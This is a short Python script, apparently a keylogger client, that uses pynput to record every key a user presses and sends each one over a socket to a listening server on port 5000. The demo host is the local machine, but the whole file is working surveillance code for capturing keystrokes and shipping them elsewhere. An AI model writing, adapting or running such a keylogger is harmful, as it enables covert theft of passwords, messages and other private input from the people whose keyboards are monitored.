# This script will capture the key presses of a user and send it to a remote server (socket_server.py). 

# Import dependecies
from pynput import keyboard
import socket

# Initialise the socket connection
host = socket.gethostname() # Server running on same machine
port = 5000 

client_socket = socket.socket()
client_socket.connect((host, port)) # Connect to server


def on_press(key):
    try:
        client_socket.send('{0}'.format(key.char).encode())
    except AttributeError:
        if key == keyboard.Key.space:
          client_socket.send(' '.encode())
        elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
           client_socket.send(''.encode())
        else:
           client_socket.send('[{0}]'.format(key).encode())

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()